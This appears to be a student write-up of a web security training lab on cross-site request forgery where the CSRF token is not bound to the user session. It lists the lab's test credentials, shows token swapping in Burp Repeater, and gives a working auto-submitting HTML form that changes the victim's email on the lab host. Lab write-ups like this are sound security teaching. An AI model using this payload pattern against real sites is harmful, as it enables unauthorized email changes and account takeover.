# CSRF where token is not tied to user session
* This lab;s email change functionality is vulnerable to CSRF, it uses token to try to prevent CSRF attacks, but they aren't interated into the site's session handling system.
	* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attck to change the viewer's email address.
	* You have two accounts on the application that you cna use to help design your attack. The credentials are as followes: `wiener:peter`, `carlos:montoya`

### 1. On the Burp web browser, intercept the request when _Wiener_ Update the email
![10](https://user-images.githubusercontent.com/53956303/153679989-815b67f3-58b9-4d48-86db-a42f7ccbae75.png)
* Capture the CSRF token and Drop the request
	* `ElzkQwLFt8OsbKbDyqbFoGeSiDNY05v9`
### 2. On the Firefox web browser, intercpet the request when _carlos_ update the email
* Then, send the request to repeater and swap the CSRF token with _wiener's_ CSRF token
	* When the modified request is sent, the 302 response is given and the _carlos's_ email is successfully updated.

![12](https://user-images.githubusercontent.com/53956303/153680358-785c1f37-6f6a-4b37-9da8-ed89de38cbae.png)
* It means that the CSRF token is not tied to a user's session cookie

### 3. Make a exploit using the provided Exploit server
* Since the CSRF token is signle-use, issue one of _weiner's_ token again to use for the exploit.
```html
<form method=post action=https://ac911f841f86ca96c0274a050012004b.web-security-academy.net/my-account/change-email>
    <input type="hidden" name="email" value="usingdifferentCSRF@pwn.com">
    <input type="hidden" name="csrf" value="ijD5nsnRyYYPfucrvPoXsFKdh05a3PhK">
</form>
<script>
        document.forms[0].submit();
</script>
```

* Store the exploit and deliver the exploit using "Deliver exploit to victim" button

![13](https://user-images.githubusercontent.com/53956303/153681554-2ad5cf56-672b-4183-a0a3-8122474c2e12.png)
* As a result, the lab is solved.

![14](https://user-images.githubusercontent.com/53956303/153681790-7ca2915f-fa4d-4b29-8c83-2f6536ef1933.png)
